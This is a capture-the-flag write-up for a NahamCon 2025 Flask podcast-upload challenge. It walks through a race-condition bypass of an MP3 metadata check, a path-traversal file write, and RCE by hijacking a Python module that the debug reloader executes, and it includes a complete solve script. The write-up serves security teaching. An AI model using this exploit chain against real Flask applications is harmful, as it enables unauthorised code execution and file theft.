# Talk Tuah

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
    - [Explore Functionalities](#explore-functionalities)
    - [Source Code Review](#source-code-review)
    - [Arbitrary File Write Vulnerability?](#arbitrary-file-write-vulnerability)
    - [Race Condition for the Win](#race-condition-for-the-win)
    - [AFW to RCE via Hijacking Python Importing Module](#afw-to-rce-via-hijacking-python-importing-module)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @Colonneil, @four0four, @sebsrt
- Solved by: @m0z, @siunam
- 14 solves / 366 points
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Guess what! You're the new Talk Tuah podcast producer!! Record, upload and manage guest episodes, and make sure the new podcast management site has its security in tip-top shape!  
  
**Download ZIP archive password is: `talk-tuah`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527123633.png)

## Enumeration

### Explore Functionalities

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527124008.png)

In here, we can upload an audio podcast episode. Let's try to upload a [sample mp3 file](https://file-examples.com/index.php/sample-audio-files/sample-mp3-download/)!

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527124712.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527124742.png)

After clicking the "Upload Episode" button, we'll be redirected to `/episodes`, which shows all of our uploaded episodes.

We can also click the "Delete" button to delete a specific episode:

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527124945.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527124953.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527125001.png)

### Source Code Review

Armed with the above high-level overview of this web application, let's review its source code!

In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/Web/Talk-Tuah/challenge.zip):

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|12:53:10(HKT)]
└> file challenge.zip 
challenge.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|12:53:12(HKT)]
└> unzip -P talk-tuah challenge.zip
Archive:  challenge.zip
  inflating: Dockerfile              
   creating: app/
  inflating: app/app.py              
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/style.css  
   creating: app/static/js/
  inflating: app/static/js/main.js   
   creating: app/templates/
  inflating: app/templates/base.html  
  inflating: app/templates/episodes.html  
  inflating: app/templates/upload.html  
 extracting: flag.txt                
 extracting: requirements.txt        
```

After reading the source code a little bit, we know that this web application is written in Python with framework [Flask](https://flask.palletsprojects.com/en/stable/).

First off, where's the flag? What's our objective in this challenge?

If we take a look at the `Dockerfile`, we can see that the flag file (`flag.txt`) is copied to `/app/flag.txt`:

```bash
[...]
WORKDIR /app

COPY flag.txt .
[...]
```

Unfortunately, the application doesn't have a way to display the flag for us. So, maybe we need to somehow read the flag file or gain Remote Code Execution (RCE).

Also, if we scroll down to the bottom of this file, we can see that the Docker container will run the application via command `python app.py`:

```bash
[...]
# Run the application
CMD ["python", "app.py"] 
```

Let's go over to the main logic of this application, `app/app.py`.

When this Python script is executed, it'll serve a Flask web application on all network interfaces on port 5000. It also set the debug mode to `True`:

```python
from flask import Flask, request, redirect, url_for, render_template, flash, jsonify, send_from_directory
[...]
app = Flask(__name__)
[...]
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True) 
```

Hmm... Interesting, this Flask application is running in debug mode. Maybe this will help us later.

In this application, it has 4 routes:
- GET, POST `/`
- GET `/episodes`
- GET `/episode/<filename>`
- POST `/delete/<filename>`

Let's head over to the one that handles file upload, POST route `/`, as it could be vulnerable to Arbitrary File Write (AFW), which could allow us to escalate to RCE.

First, when we send a POST request to `/`, it'll check whether our request has form data parameter `file` and the `filename` is not empty:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file provided', 'danger')
            return redirect(request.url)
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected', 'danger')
            return redirect(request.url)
        [...]
```

After that, it'll extract our filename by calling function [`secure_filename`](https://werkzeug.palletsprojects.com/en/stable/utils/#werkzeug.utils.secure_filename) to remove path traversal sequences (I.e.: `../`) and normalize unicode characters. The extracted filename will then be combined with `EPISODE_FOLDER`, which will be `static/episodes/<filename>`:

```python
import os
[...]
from werkzeug.utils import secure_filename
[...]
app.config['EPISODE_FOLDER'] = os.path.join('static', 'episodes')
[...]
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        filename = secure_filename(file.filename)
        ext = os.path.splitext(filename)[1].lower()
        filepath = os.path.join(app.config['EPISODE_FOLDER'], filename)
        file.save(filepath)
        [...]
```

After parsing the filename, it'll call method [`save`](https://werkzeug.palletsprojects.com/en/stable/datastructures/#werkzeug.datastructures.FileStorage.save) to write the file's content to `static/episodes/<filename>`.

Also, if our filename's extension is not `.mp3`, it'll run OS command `ffmpeg` to convert the file to MP3 format and remove the old one:

```python
import subprocess
[...]
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        # If not mp3, convert to mp3 and update filename/filepath
        if ext != '.mp3':
            mp3_filename = os.path.splitext(filename)[0] + '.mp3'
            mp3_filepath = os.path.join(app.config['EPISODE_FOLDER'], mp3_filename)
            # Convert using ffmpeg
            subprocess.run([
                "ffmpeg", "-y", "-i", filepath, mp3_filepath
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove(filepath)
            filename = mp3_filename
            filepath = mp3_filepath
        [...]
```

If we look at `ffmpeg`'s usage, the `-y` option is to overwrite the output file(s), and the `-i` option is to specific the input file:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|13:21:03(HKT)]
└> ffmpeg -h                                
[...]
usage: ffmpeg [options] [[infile options] -i infile]... {[outfile options] outfile}...
[...]
-y                  overwrite output files
[...]
```

In short, this `ffmpeg` command is to take our uploaded file (`filename.foo`) and write/overwrite a MP3 file to `filename.mp3`.

In the last validation, it'll call function `is_valid_mp3` with the parsed and combined file path (`static/episodes/<filename>`) as an argument:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        if not is_valid_mp3(filepath):
            flash('❌ Incompatible MP3 metadata', 'danger')
            return redirect(request.url)
        [...]
```

Let's take a look at that function!

First, it'll get our uploaded file's format by using command `ffprobe`:

```python
def is_valid_mp3(filepath):
    try:
        [...]
        result = subprocess.run([
            'ffprobe', '-v', 'error', '-show_entries', 'format=format_name',
            '-of', 'default=noprint_wrappers=1:nokey=1', filepath
        ], capture_output=True, text=True)
        [...]
    except Exception as e:
        return False
```

For example, if the file's format is MP3, it'll write `mp3` to the stdout (standard output):

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|13:39:35(HKT)]
└> ffprobe -v error -show_entries format=format_name -of default=noprint_wrappers=1:nokey=1 ./file_example_MP3_700KB.mp3 
mp3
```

After getting the file's format, it'll then run command `ffprobe` again. But this time it prints out the MP3 file's metadata in JSON format to stdout:

```python
def is_valid_mp3(filepath):
    try:
        [...]
        meta_check = subprocess.run([
            'ffprobe', '-v', 'quiet', '-print_format', 'json', '-show_format', filepath
        ], capture_output=True, text=True)
        [...]
    except Exception as e:
        return False
```

Example:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|13:39:41(HKT)]
└> ffprobe -v quiet -print_format json -show_format ./file_example_MP3_700KB.mp3
{
    "format": {
        "filename": "./file_example_MP3_700KB.mp3",
        "nb_streams": 1,
        "nb_programs": 0,
        "format_name": "mp3",
        "format_long_name": "MP2/3 (MPEG audio layer 2/3)",
        "start_time": "0.025057",
        "duration": "42.057143",
        "size": "733645",
        "bit_rate": "139552",
        "probe_score": 51,
        "tags": {
            "Encoded by": "LAME in FL Studio 20",
            "BPM (beats per minute)": "120",
            "date": "2018"
        }
    }
}
```

After getting the JSON metadata, it'll try to parse the output via [`loads`](https://docs.python.org/3/library/json.html#json.loads) function from module [`json`](https://docs.python.org/3/library/json.html) and retrieve key `episode_name`'s value from key `tags`:

```python
import json
[...]
def is_valid_mp3(filepath):
    try:
        [...]
        tags = json.loads(meta_check.stdout).get('format', {}).get('tags', {})
        episode_name = tags.get('episode_name', '')
        if episode_name != '' and not episode_name.isalnum():
            # Incompatible MP3 metadata found
            return False
        [...]
    except Exception as e:
        return False
```

If tag `episode_name` is not an empty string, and it's not alphanumeric, it'll return `False`, which is an invalid MP3 file.

Finally, if file's format is `mp3`, it'll return `True`. Otherwise, return `False`:

```python
import json
[...]
def is_valid_mp3(filepath):
    try:
        [...]
        return 'mp3' in result.stdout.strip()
    except Exception as e:
        return False
```

Hmm... That `episode_name` tag is weird. Maybe we could do something about it?

Let's keep reading the file upload logic!

After validating everything, it'll get the loudness of our MP3 file and normalize it. However, this part is not that relevant to us:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        loud_output = filepath + ".vol.mp3"
        normalized_output = filepath + ".norm.mp3"

        # Determine the loudness of the episode
        subprocess.run(["ffmpeg", "-i", filepath, "-af", "volume=2.0", "-f", "mp3", "-y", loud_output])

        # Normalize the file to a more standard level
        subprocess.run([
            "ffmpeg", "-i", loud_output,
            "-filter_complex", "[0:a]aecho=0.8:0.9:1000:0.3,apad=pad_dur=2,areverse[a];[a]areverse",
            "-map_metadata", "0",
            "-f", "mp3", "-y", normalized_output
        ])
        [...]
```

After that, it'll again print out our MP3 file's metadata in JSON format using command `ffprobe` and parse it. This time, however, it'll retrieve tag `episode_name`'s value and combine it with `EPISODE_METADATA_FOLDER`, which is `static/episode_metadata`:

```python
app.config['EPISODE_METADATA_FOLDER'] = os.path.join('static', 'episode_metadata')
[...]
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        try:
            probe = subprocess.run([
                "ffprobe", "-v", "quiet", "-print_format", "json", "-show_format", filepath
            ], capture_output=True, text=True)
            metadata = json.loads(probe.stdout)
            if "format" not in metadata:
                raise ValueError("No format section in ffprobe output")
            target_path = app.config['EPISODE_METADATA_FOLDER'] + "/" + metadata["format"].get("tags", {}).get("episode_name", secure_filename(filename))

        except Exception as e:
            flash(f"❌ Episode name extraction failed: {str(e)}", 'danger')
            return redirect(request.url)
        [...]
```

Therefore, `target_path` will be something like `static/episode_metadata/<episode_name>`. If tag `episode_metadata` doesn't exist, it'll fall back to the extracted filename.

With this `target_path`, it'll extract all the metadata into a plaintext format to that path:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        subprocess.run(["ffmpeg", "-i", filepath, "-f", "ffmetadata", "-y", target_path])
        [...]
```

Example:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|14:04:08(HKT)]
└> ffmpeg -i ./file_example_MP3_700KB.mp3 -f ffmetadata -y episode_name_here.txt 
[...]
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|14:04:10(HKT)]
└> cat episode_name_here.txt 
;FFMETADATA1
Encoded by=LAME in FL Studio 20
BPM (beats per minute)=120
date=2018
encoder=Lavf59.27.100
```

Finally, it'll remove the first line and the last line from that plaintext metadata file. Maybe because the first line is [the header for ffmpeg](https://ffmpeg.org/ffmpeg-formats.html#Metadata-2) and the last line is not needed?

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        try:
            with open(target_path, "r") as f:
                lines = f.readlines()
            with open(target_path, "w") as f:
                for line in lines[1:-1]:
                        f.write(line)
        except Exception as e:
            flash(f"❌ Episode post-processing failed: {str(e)}", 'danger')
            return redirect(request.url)
        [...]
```

In the above example, the final plaintext metadata file's content will be like this:

```
Encoded by=LAME in FL Studio 20
BPM (beats per minute)=120
date=2018
```

### Arbitrary File Write Vulnerability?

Hmm... Since we can control `target_path` (tag `episode_name`), maybe we can write arbitrary files to anywhere via **path traversal**?

For instance, if tag `episode_name` is `../../../../../tmp/foo.txt`, the `target_path` should be `static/episode_metadata/../../../../../tmp/foo.txt`, which ultimately writes the metadata file to path `/tmp/foo.txt`.

But wait a minute, isn't there's an alphanumeric character check in function `is_valid_mp3`?

```python
def is_valid_mp3(filepath):
    try:
        [...]
        episode_name = tags.get('episode_name', '')
        if episode_name != '' and not episode_name.isalnum():
            # Incompatible MP3 metadata found
            return False

        [...]
    except Exception as e:
        return False
```

Is it possible to bypass this check?

### Race Condition for the Win

If we look at variable **`filepath`**, we can see that the application uses it a lot:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        [...]
        filename = secure_filename(file.filename)
        [...]
        filepath = os.path.join(app.config['EPISODE_FOLDER'], filename)
        file.save(filepath)
        [...]
        if not is_valid_mp3(filepath):
            [...]
        try:
            probe = subprocess.run([
                "ffprobe", "-v", "quiet", "-print_format", "json", "-show_format", filepath
            ], capture_output=True, text=True)
            [...]
        except Exception as e:
            [...]

        subprocess.run(["ffmpeg", "-i", filepath, "-f", "ffmetadata", "-y", target_path])
        [...]
```

As we can see, our request's file is written **BEFORE** calling function `is_valid_mp3`, and the application will continue use that file.

What if, we **first upload a valid MP3 file (I.e.: `foo.mp3`)**. Then, after the application calling function `is_valid_mp3`, we quickly **swap the valid MP3 file** with our malicious MP3 file (I.e.: `foo.mp3`) that contains the path traversal payload in the `episode_name` tag? Since the application doesn't check the integrity of our uploaded file, we should be able to do this.

Another thing is that since those `ffmpeg` and `ffprobe` takes time to run, we should be able to get a decent amount of race window.

Therefore, it is possible to bypass the alphanumeric character check in function `is_valid_mp3` by leveraging race condition vulnerability (Limited overrun, AKA [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)):

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/race_window.png)

And if we want to increase the race window, we can upload the valid MP3 file with a bigger size, so that those commands will process the valid file longer.

### AFW to RCE via Hijacking Python Importing Module

With that validation out of the way, let's think about how can we escalate this vulnerability to RCE. Remember, we need to somehow read the flag file or gain RCE.

Fortunately, there are many well known techniques to do so in Flask web application, including but not limited to overwriting [Jinja](https://jinja.palletsprojects.com/en/stable/) template file(s), overwriting application source code (I.e.: `.py`, `.pyc`), libraries, configuration files, and more. Feel free to explore those in details in [Jorian's GitBook about AFW](https://book.jorianwoltjer.com/web/server-side/arbitrary-file-write).

For me, I decided to put my research result into practice! (During the CTF, my teammate chose to overwrite the template file, as it's easier to do so.)

A month ago, I published this research: [Python Dirty Arbitrary File Write to RCE via Writing Shared Object Files Or Overwriting Bytecode Files](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/). The TL;DR is that it is possible to gain RCE by writing shared object files (`.so` file), as Python will take `.so` files' precedence over `.py` files.

But then how the application execute the shared object? In my research blog post section "[Not Importing Modules Dynamically??](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/#not-importing-modules-dynamically)", if the application uses **Flask with debug mode on** or any frameworks that are using [Werkzeug's Reloader](https://werkzeug.palletsprojects.com/en/stable/serving/#reloader), we can write a `.pyc` file to trigger Werkzeug's Reloader to reload the application, thus executing our own shared object. Did you still remember that from the beginning? The application is indeed running on debug mode!

Uhh... Wait a minute, which module(s) should we overwrite? Wait, the entire application only has `app.py` and nothing else!

If we look at `app/app.py`, we can see that it imports other third-party modules:

```python
import os
import subprocess
import json
from flask import Flask, request, redirect, url_for, render_template, flash, jsonify, send_from_directory
from werkzeug.utils import secure_filename
from datetime import datetime
```

Hmm... It is possible to **hijack** those modules?

In my research, I presented this [flow chart from PEP 3147](https://peps.python.org/pep-3147/#flow-chart):

![](https://github.com/siunam321/CTF-Writeups/blob/main/NahamCon-CTF-2025/images/Pasted%20image%2020250527152952.png)

Aha! What if we write, let's say `json.so`, will Python import our `json.so` instead of the installed module path?

> Note: You can write `.py` or `.pyc` file to achieve the same result, as there's no `json.py` in the current directory. I used `.so` file just because it is very cool.

Let's try to hijack module `json`! Here's a simple Proof of concept `json.py` Python script:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.05.27|15:35:50(HKT)]
└> echo -n "print('Hello World from json module')" > json.py
```

- Compile `json.py` into `.so` via [cythonize](https://cython.readthedocs.io/en/latest/src/userguide/source_files_and_compilation.html) and rename the compiled shared object to `json.so`:

```shell
┌[siunam♥Mercury]-(~/Downloads)-[2025.05.27|15:36:17(HKT)]
└> cythonize -i json.py
[...]
┌[siunam♥Mercury]-(~/Downloads)-[2025.05.27|15:36:21(HKT)]
└> mv json.cpython-311-x86_64-linux-gnu.so ~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah/app/json.so
```

- Run `app.py`:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|15:37:18(HKT)]
└> cd app          
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah/app)-[2025.05.27|15:37:21(HKT)]
└> python3 app.py 
Hello World from json module
Traceback (most recent call last):
[...]
  File "/usr/lib/python3/dist-packages/werkzeug/test.py", line 350, in EnvironBuilder
    json_dumps = staticmethod(json.dumps)
                              ^^^^^^^^^^
AttributeError: module 'json' has no attribute 'dumps'
```

Oh! We indeed successfully hijacked the `json` module!

Unfortunately, after playing with the metadata, I realized that the delimiter character is a null byte (`\x00`), so our payload can't contain any null byte characters:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|15:54:36(HKT)]
└> hexedit file_example_MP3_700KB.mp3                                                      
00000000   49 44 33 03  00 00 00 00  00 6D 54 58  58 58 00 00  00 20 00 00  ID3......mTXXX... ..
00000014   00 66 6F 6F  00 62 61 72  00 41 41 41  41 41 41 41  41 41 41 41  .foo.bar.AAAAAAAAAAA
[...]
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|15:54:52(HKT)]
└> ffmpeg -i ./file_example_MP3_700KB.mp3 -f ffmetadata -y metadata.txt && cat metadata.txt
[...]
;FFMETADATA1
foo=bar
BPM (beats per minute)=120
date=2018
encoder=Lavf59.27.100
```

With that said, we can try to write `json.py`, as it doesn't contain any null bytes.

After crafting a valid Python script and metadata syntax, we have the following file, `metadata.txt`:

```python
;FFMETADATA1
command='cat /app/flag.txt'
anything=__import__('os').system(command)
'''=A
episode_name=../../json.py
A='''
```

We can then add those metadata into our original MP3 file:

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|16:29:32(HKT)]
└> ffmpeg -i file_example_MP3_700KB.mp3 -i metadata.txt -map_metadata 1 -codec copy -y output.mp3
[...]
Output #0, mp3, to 'output.mp3':
  Metadata:
    command         : 'cat /app/flag.txt > /app/static/episodes/flag.txt'
    anything        : __import__('os').system(command)
    '''             : A
    episode_name    : ../../json.py
    A               : '''
    TSSE            : Lavf59.27.100
  [...]
[...]
```

## Exploitation

Armed with above information, we can gain RCE via the following steps:
1. Upload a valid MP3 file
2. Time carefully and swap the valid one with our own malicious one

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import random
import string
import subprocess
from io import BytesIO
from threading import Thread
from time import sleep

class Solver:
    RANDOM_STRING_CHARACTER_SET = string.ascii_letters

    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.MP3_EXTENSION = '.mp3'
        self.STATIC_DIRECTORY = '/static/'
        self.FLAG_FILENAME = 'flag.txt'
    
    @staticmethod
    def generateRandomString(length):
        return ''.join(random.choice(Solver.RANDOM_STRING_CHARACTER_SET) for _ in range(length))

    def addNewMetaData(self, validMp3FilePath, metadata):
        with open('metadata.txt', 'w') as file:
            file.write(metadata)
        
        subprocess.run([
            'ffmpeg', '-i', validMp3FilePath, '-i', 'metadata.txt', '-map_metadata', '1', '-codec', 'copy', '-y', 'output.mp3'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def uploadFile(self, filename, content):
        print(f'[*] Uploading file {filename}...')

        byteContent = content.encode() if isinstance(content, str) else content
        file = { 'file': (filename, BytesIO(byteContent)) }
        requests.post(self.baseUrl, files=file)

    def readStaticFile(self, filename):
        url = f'{self.baseUrl}{self.STATIC_DIRECTORY}{filename}'
        response = requests.get(url)
        if response.status_code == 404:
            print('[-] File not found')
            exit()

        print(f'[+] File content: {response.text.strip()}')

    def exploit(self, validMp3FilePath, metadata, delaySecond=0.2, isReload=False):
        filename = Solver.generateRandomString(10) + self.MP3_EXTENSION
        with open(validMp3FilePath, 'rb') as file:
            originalMp3FileContent = file.read()

        self.addNewMetaData(validMp3FilePath, metadata)
        with open('output.mp3', 'rb') as file:
            newMp3FileContent = file.read()

        thread1 = Thread(target=self.uploadFile, args=(filename, originalMp3FileContent))
        thread1.start()
        sleep(delaySecond)

        thread2 = Thread(target=self.uploadFile, args=(filename, newMp3FileContent))
        thread2.start()

        # wait for all threads to be completed
        thread1.join()
        thread2.join()

        if isReload:
            print('[*] Sleep 1 second to wait for the command to be executed...')
            sleep(1)
            self.readStaticFile(self.FLAG_FILENAME)

    def solve(self, validMp3FilePath, metadata, delaySecond=0.2):
        print('[*] Writing our payload...')
        self.exploit(validMp3FilePath, metadata, delaySecond)
        print('[*] Sleeping 1 second to trigger the reload, as the modification will be different...')
        sleep(1)
        self.exploit(validMp3FilePath, metadata, delaySecond, isReload=True)

if __name__ == '__main__':
    # baseUrl = 'http://localhost:5000' # for local testing
    baseUrl = 'http://challenge.nahamcon.com:30610'
    solver = Solver(baseUrl)

    validMp3FilePath = './file_example_MP3_700KB.mp3'
    metadata = """
;FFMETADATA1
command='cat /app/flag.txt > /app/static/flag.txt'
anything=__import__('os').system(command)
'''=A
episode_name=../../subprocess.py
A='''
""".strip()
    # delaySecond = 0.2 # for local testing
    delaySecond = 5 # for remote instance. i found this by trial and error
    solver.solve(validMp3FilePath, metadata, delaySecond)
```

</details>

> Note: The solve script will hijack module `subprocess` instead of `json`. This is because Flask has a dependency on the `json` module. If we hijack it, the web application will break and make us much harder to exfiltrate the flag.

```shell
┌[siunam♥Mercury]-(~/ctf/NahamCon-CTF-2025/Web/Talk-Tuah)-[2025.05.27|17:39:51(HKT)]
└> python3 solve.py
[*] Writing our payload...
[*] Uploading file YfOpxvtoAi.mp3...
[*] Uploading file YfOpxvtoAi.mp3...
[*] Sleeping 1 second to trigger the reload, as the modification will be different...
[*] Uploading file Scgtriefeo.mp3...
[*] Uploading file Scgtriefeo.mp3...
[*] Sleep 1 second to wait for the command to be executed...
[+] File content: flag{bbdc7062c109c406a674ce3cfdcc59a0}
```

- Flag: **`flag{bbdc7062c109c406a674ce3cfdcc59a0}`**

## Conclusion

What we've learned:

1. Arbitrary File Write via race condition
2. Arbitrary File Write to RCE via hijacking Python importing module